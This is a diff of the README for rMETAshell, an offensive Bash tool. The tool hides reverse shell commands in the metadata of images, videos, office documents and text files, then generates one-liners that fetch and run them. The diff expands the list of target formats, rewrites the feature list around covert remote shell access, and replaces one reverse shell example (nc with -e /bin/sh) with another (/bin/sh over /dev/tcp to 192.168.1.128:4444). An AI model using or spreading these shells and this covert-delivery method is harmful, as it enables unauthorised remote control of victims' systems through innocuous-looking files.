@@ -4,8 +4,6 @@
  ![Language](https://img.shields.io/badge/Language-Bash-green.svg)
  ![License](https://img.shields.io/badge/License-MIT-blue.svg) 
 
-
-Reverse shell metadata injection compatible with jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx and txt!.
 <img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell1.png">
 Clean image file no reverse shell.
 <img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell2.png">
@@ -16,7 +14,9 @@ Connection established, mission accomplished!
 
 # New!:
 
-Supports jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt!
+New one-liner execution methods!
+
+Supports png, jpg, jpeg, jpe, jif, jfif, jfi, jp2, j2k, jpf, jpx, jp2a, j2c, tif, tiff, crw, cr2, dng, mrw, nef, pef, arw, rw2, sr2, srw, orf, png, gif, bmp, dib, ico, pgf, jp2, j2k, jpf, jpx, jp2a, j2c, avi, mov, qt, moov, f4v, mp4, m4a, m4b, m4p, m4v, mp4v, mqv, jp2, j2k, jpf, jpx, jp2a, j2c, mpg, mpeg, m2v, mpv, m2p, m1v, m1p, m4v, divx, xvid, txt, text, log, md, markdown, html, htm, xml, json, csv, tsv, sql, yml, yaml, ini, cfg, conf, properties, prop, props, bat, sh, bash, zsh, ps1, ps, py, python, rb, ruby, perl, pl, php, js, javascript, jsx, ts, typescript, java, c, cpp, h, cs, csharp, vb, vbnet, swift, kotlin, rust, go, groovy, scala, lua, r, sas, scss, sass, less, styl, sql, plsql, psql, tsql, vbs, vba, vbscript, powershell, ps1xml, psd1, psm1, tex, latex, ltx, bib, rtf, doc, docx, xls, xlsx, ppt, pptx and pdf injection!
 
 # Description:
 
@@ -26,10 +26,15 @@ rMETAshell is a command-line tool for injecting a reverse shell command into the
 rMETAshell takes a reverse shell command and an image file as input. It then injects the command into the image using metadata comments. After injection, it generates a one-liner execution method for retrieving and executing the injected command from a remote location.
 
 # Features:
-Covert Command Injection: Inject reverse shell commands into image files.
-Multiple Execution Methods: Choose from various one-liner execution methods for retrieving and executing the injected command.
-Versatile Compatibility: Works with common Linux command-line utilities such as exiftool, exiv2, identify, file, and jpeginfo.
-Secure Communication: Execute commands remotely without revealing their presence in the image.
+Metadata-Based Shell Injection: Inject reverse shell commands into image, video, and text file metadata, ensuring seamless integration with target systems.
+
+One-Liner Generation: Automatically generate one-liners for quick and efficient remote shell access. Choose from a variety of execution methods tailored to different file formats.
+
+Supported File Formats: rMETAshell supports the following file formats for shell injection and one-liner generation:
+
+Image Formats: JPEG, PNG, BMP, and more.
+Video Formats: MP4, AVI, MKV, and others.
+Text Formats: TXT, CSV, XML, and more.
 
 ## Installation
 
@@ -64,7 +69,7 @@ Secure Communication: Execute commands remotely without revealing their presence
 **Example:**
 
 ```
-./rMETAshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
+./rMETAshell.sh "/bin/sh -i >& /dev/tcp/192.168.1.128/4444 0>&1" image.jpg test.zip
 ```
 
 Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rMETAshell.
